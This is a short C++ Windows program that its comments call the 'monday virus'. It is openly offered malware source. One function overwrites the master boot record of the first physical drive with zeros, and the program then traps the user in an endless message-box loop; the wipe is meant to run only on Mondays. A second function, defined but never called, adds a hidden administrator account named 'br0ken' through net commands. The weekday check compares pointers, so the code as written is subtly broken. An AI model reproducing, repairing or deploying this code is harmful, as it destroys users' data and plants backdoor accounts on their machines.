#include <Windows.h>
#include <iostream>
#include <ctime>
#include <stdio.h>

// monday virus
// overwrites MBR, but only on monday.

#define MBR_SIZE 512

using namespace std;

int ZeroMBR(void) {
	DWORD write;
	char data[MBR_SIZE];

	ZeroMemory(&data, sizeof(data));

	HANDLE disk = CreateFile((LPCSTR)"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	WriteFile(disk, data, MBR_SIZE, &write, NULL);
	CloseHandle(disk);


	return 0;
}

void AddAdminUser(void) {
	char * adduser = "net user /add br0ken br0ken";
	char * addasadmin = "net localgroup administrators br0ken /add";

	WinExec((LPCSTR)adduser, 0);
	WinExec((LPCSTR)addasadmin, 0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	time_t rawtime;
	struct tm * timeinfo;
	char buffer[100];

	time(&rawtime);
	timeinfo = localtime(&rawtime);

	strftime(buffer, sizeof(buffer), "%A", timeinfo);

	const char * str(buffer);

	if (str == "Monday") {
		ZeroMBR();

		while (1) {
			int msgBox = MessageBox(NULL, (LPCSTR)"hi", (LPCSTR)"I don't like ur computer", MB_OK);
		}

	}

	MessageBox(NULL, (LPSTR)str, (LPSTR)str, MB_OK);

	return 0;
}
